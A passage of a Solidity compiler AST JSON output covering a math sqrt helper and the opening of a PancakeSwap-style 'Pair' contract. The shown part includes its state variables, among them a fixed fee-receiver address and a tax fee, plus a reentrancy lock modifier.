																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 910,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"components": [
																						{
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 907,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 905,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"id": 903,
																									"name": "y",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 875,
																									"src": "560:1:5",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "/",
																								"rightExpression": {
																									"argumentTypes": null,
																									"id": 904,
																									"name": "x",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 888,
																									"src": "564:1:5",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"src": "560:5:5",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 906,
																								"name": "x",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 888,
																								"src": "568:1:5",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "560:9:5",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						}
																					],
																					"id": 908,
																					"isConstant": false,
																					"isInlineArray": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "TupleExpression",
																					"src": "559:11:5",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "/",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 909,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "573:1:5",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "559:15:5",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "555:19:5",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 912,
																		"nodeType": "ExpressionStatement",
																		"src": "555:19:5"
																	}
																]
															},
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 897,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 895,
																	"name": "x",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 888,
																	"src": "507:1:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 896,
																	"name": "z",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 878,
																	"src": "511:1:5",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "507:5:5",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 914,
															"nodeType": "WhileStatement",
															"src": "500:89:5"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 927,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sqrt",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 876,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 875,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 927,
												"src": "366:9:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 874,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "366:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "365:11:5"
									},
									"returnParameters": {
										"id": 879,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 878,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 927,
												"src": "400:9:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 877,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "400:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "399:11:5"
									},
									"scope": 928,
									"src": "352:301:5",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 929,
							"src": "115:540:5"
						}
					],
					"src": "36:620:5"
				},
				"id": 5
			},
			"src/Pair.sol": {
				"ast": {
					"absolutePath": "src/Pair.sol",
					"exportedSymbols": {
						"Pair": [
							2193
						]
					},
					"id": 2194,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 930,
							"literals": [
								"solidity",
								"=",
								"0.5",
								".16"
							],
							"nodeType": "PragmaDirective",
							"src": "36:24:6"
						},
						{
							"absolutePath": "src/IPair.sol",
							"file": "./IPair.sol",
							"id": 931,
							"nodeType": "ImportDirective",
							"scope": 2194,
							"sourceUnit": 853,
							"src": "62:21:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/ERC20.sol",
							"file": "./ERC20.sol",
							"id": 932,
							"nodeType": "ImportDirective",
							"scope": 2194,
							"sourceUnit": 436,
							"src": "84:21:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/Math.sol",
							"file": "./Math.sol",
							"id": 933,
							"nodeType": "ImportDirective",
							"scope": 2194,
							"sourceUnit": 929,
							"src": "106:20:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/UQ112x112.sol",
							"file": "./UQ112x112.sol",
							"id": 934,
							"nodeType": "ImportDirective",
							"scope": 2194,
							"sourceUnit": 2311,
							"src": "127:25:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/IERC20.sol",
							"file": "./IERC20.sol",
							"id": 935,
							"nodeType": "ImportDirective",
							"scope": 2194,
							"sourceUnit": 534,
							"src": "153:22:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/IFactory.sol",
							"file": "./IFactory.sol",
							"id": 936,
							"nodeType": "ImportDirective",
							"scope": 2194,
							"sourceUnit": 602,
							"src": "176:24:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "src/ICallee.sol",
							"file": "./ICallee.sol",
							"id": 937,
							"nodeType": "ImportDirective",
							"scope": 2194,
							"sourceUnit": 450,
							"src": "201:23:6",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"baseContracts": [
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 938,
										"name": "IPair",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 852,
										"src": "243:5:6",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_IPair_$852",
											"typeString": "contract IPair"
										}
									},
									"id": 939,
									"nodeType": "InheritanceSpecifier",
									"src": "243:5:6"
								},
								{
									"arguments": null,
									"baseName": {
										"contractScope": null,
										"id": 940,
										"name": "ERC20",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 435,
										"src": "250:5:6",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_ERC20_$435",
											"typeString": "contract ERC20"
										}
									},
									"id": 941,
									"nodeType": "InheritanceSpecifier",
									"src": "250:5:6"
								}
							],
							"contractDependencies": [
								435,
								533,
								852
							],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 2193,
							"linearizedBaseContracts": [
								2193,
								435,
								533,
								852
							],
							"name": "Pair",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 944,
									"libraryName": {
										"contractScope": null,
										"id": 942,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2268,
										"src": "268:8:6",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$2268",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "262:24:6",
									"typeName": {
										"id": 943,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "281:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"id": 947,
									"libraryName": {
										"contractScope": null,
										"id": 945,
										"name": "UQ112x112",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 2310,
										"src": "297:9:6",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_UQ112x112_$2310",
											"typeString": "library UQ112x112"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "291:28:6",
									"typeName": {
										"id": 946,
										"name": "uint224",
										"nodeType": "ElementaryTypeName",
										"src": "311:7:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint224",
											"typeString": "uint224"
										}
									}
								},
								{
									"constant": false,
									"id": 950,
									"name": "FeeResiver",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "325:70:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 948,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "325:7:6",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "307839453934456536394633436443643545373465303535363337333645343637396441366442343463",
										"id": 949,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "353:42:6",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_address_payable",
											"typeString": "address payable"
										},
										"value": "0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c"
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 955,
									"name": "MINIMUM_LIQUIDITY",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "402:48:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 951,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "402:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"argumentTypes": null,
										"commonType": {
											"typeIdentifier": "t_rational_1000_by_1",
											"typeString": "int_const 1000"
										},
										"id": 954,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"lValueRequested": false,
										"leftExpression": {
											"argumentTypes": null,
											"hexValue": "3130",
											"id": 952,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "443:2:6",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_10_by_1",
												"typeString": "int_const 10"
											},
											"value": "10"
										},
										"nodeType": "BinaryOperation",
										"operator": "**",
										"rightExpression": {
											"argumentTypes": null,
											"hexValue": "33",
											"id": 953,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"kind": "number",
											"lValueRequested": false,
											"nodeType": "Literal",
											"src": "449:1:6",
											"subdenomination": null,
											"typeDescriptions": {
												"typeIdentifier": "t_rational_3_by_1",
												"typeString": "int_const 3"
											},
											"value": "3"
										},
										"src": "443:7:6",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_1000_by_1",
											"typeString": "int_const 1000"
										}
									},
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 964,
									"name": "SELECTOR",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "456:96:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes4",
										"typeString": "bytes4"
									},
									"typeName": {
										"id": 956,
										"name": "bytes4",
										"nodeType": "ElementaryTypeName",
										"src": "456:6:6",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes4",
											"typeString": "bytes4"
										}
									},
									"value": {
										"argumentTypes": null,
										"arguments": [
											{
												"argumentTypes": null,
												"arguments": [
													{
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"hexValue": "7472616e7366657228616464726573732c75696e7432353629",
																"id": 960,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "522:27:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_a9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b",
																	"typeString": "literal_string \"transfer(address,uint256)\""
																},
																"value": "transfer(address,uint256)"
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_stringliteral_a9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b",
																	"typeString": "literal_string \"transfer(address,uint256)\""
																}
															],
															"id": 959,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "516:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																"typeString": "type(bytes storage pointer)"
															},
															"typeName": "bytes"
														},
														"id": 961,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "516:34:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes memory"
														}
													}
												],
												"expression": {
													"argumentTypes": [
														{
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes memory"
														}
													],
													"id": 958,
													"name": "keccak256",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 2319,
													"src": "506:9:6",
													"typeDescriptions": {
														"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
														"typeString": "function (bytes memory) pure returns (bytes32)"
													}
												},
												"id": 962,
												"isConstant": false,
												"isLValue": false,
												"isPure": true,
												"kind": "functionCall",
												"lValueRequested": false,
												"names": [],
												"nodeType": "FunctionCall",
												"src": "506:45:6",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												}
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_bytes32",
													"typeString": "bytes32"
												}
											],
											"id": 957,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"lValueRequested": false,
											"nodeType": "ElementaryTypeNameExpression",
											"src": "499:6:6",
											"typeDescriptions": {
												"typeIdentifier": "t_type$_t_bytes4_$",
												"typeString": "type(bytes4)"
											},
											"typeName": "bytes4"
										},
										"id": 963,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "typeConversion",
										"lValueRequested": false,
										"names": [],
										"nodeType": "FunctionCall",
										"src": "499:53:6",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes4",
											"typeString": "bytes4"
										}
									},
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 966,
									"name": "factory",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "559:22:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 965,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "559:7:6",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 968,
									"name": "token0",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "587:21:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 967,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "587:7:6",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 970,
									"name": "token1",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "614:21:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 969,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "614:7:6",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 972,
									"name": "taxfee",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "641:18:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 971,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "641:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 974,
									"name": "reserve0",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "666:24:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint112",
										"typeString": "uint112"
									},
									"typeName": {
										"id": 973,
										"name": "uint112",
										"nodeType": "ElementaryTypeName",
										"src": "666:7:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint112",
											"typeString": "uint112"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 976,
									"name": "reserve1",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "752:24:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint112",
										"typeString": "uint112"
									},
									"typeName": {
										"id": 975,
										"name": "uint112",
										"nodeType": "ElementaryTypeName",
										"src": "752:7:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint112",
											"typeString": "uint112"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 978,
									"name": "blockTimestampLast",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "838:33:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint32",
										"typeString": "uint32"
									},
									"typeName": {
										"id": 977,
										"name": "uint32",
										"nodeType": "ElementaryTypeName",
										"src": "838:6:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint32",
											"typeString": "uint32"
										}
									},
									"value": null,
									"visibility": "private"
								},
								{
									"constant": false,
									"id": 980,
									"name": "price0CumulativeLast",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "934:32:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 979,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "934:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 982,
									"name": "price1CumulativeLast",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "972:32:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 981,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "972:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 984,
									"name": "kLast",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "1010:17:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 983,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "1010:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 987,
									"name": "unlocked",
									"nodeType": "VariableDeclaration",
									"scope": 2193,
									"src": "1114:25:6",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 985,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "1114:4:6",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "31",
										"id": 986,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "1138:1:6",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_1_by_1",
											"typeString": "int_const 1"
										},
										"value": "1"
									},
									"visibility": "private"
								},
								{
									"body": {
										"id": 1005,
										"nodeType": "Block",
										"src": "1161:113:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 992,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 990,
																"name": "unlocked",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 987,
																"src": "1179:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "31",
																"id": 991,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1191:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1_by_1",
																	"typeString": "int_const 1"
																},
																"value": "1"
															},
															"src": "1179:13:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a204c4f434b4544",
															"id": 993,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1194:17:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c084a590425edfe86a11f73831c0243820669c7e4ae4ddc8e665ae7ef10c474a",
																"typeString": "literal_string \"Pancake: LOCKED\""
															},
															"value": "Pancake: LOCKED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_c084a590425edfe86a11f73831c0243820669c7e4ae4ddc8e665ae7ef10c474a",
																"typeString": "literal_string \"Pancake: LOCKED\""
															}
														],
														"id": 989,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "1171:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 994,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1171:41:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 995,
												"nodeType": "ExpressionStatement",
												"src": "1171:41:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 998,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 996,
														"name": "unlocked",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 987,
														"src": "1222:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 997,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1233:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "1222:12:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 999,
												"nodeType": "ExpressionStatement",
												"src": "1222:12:6"
											},
											{
												"id": 1000,
												"nodeType": "PlaceholderStatement",
												"src": "1244:1:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1003,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1001,
														"name": "unlocked",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 987,
														"src": "1255:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 1002,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1266:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "1255:12:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1004,
												"nodeType": "ExpressionStatement",
												"src": "1255:12:6"
											}
										]
									},
									"documentation": null,
									"id": 1006,
									"name": "lock",
									"nodeType": "ModifierDefinition",
									"parameters": {
										"id": 988,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1158:2:6"
									},
									"src": "1145:129:6",
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1027,
										"nodeType": "Block",
										"src": "1464:117:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1017,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1015,
														"name": "_reserve0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1009,
														"src": "1474:9:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1016,
														"name": "reserve0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 974,
														"src": "1486:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "1474:20:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 1018,
												"nodeType": "ExpressionStatement",
												"src": "1474:20:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1021,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1019,
														"name": "_reserve1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1011,
														"src": "1504:9:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1020,
														"name": "reserve1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 976,
														"src": "1516:8:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														}
													},
													"src": "1504:20:6",
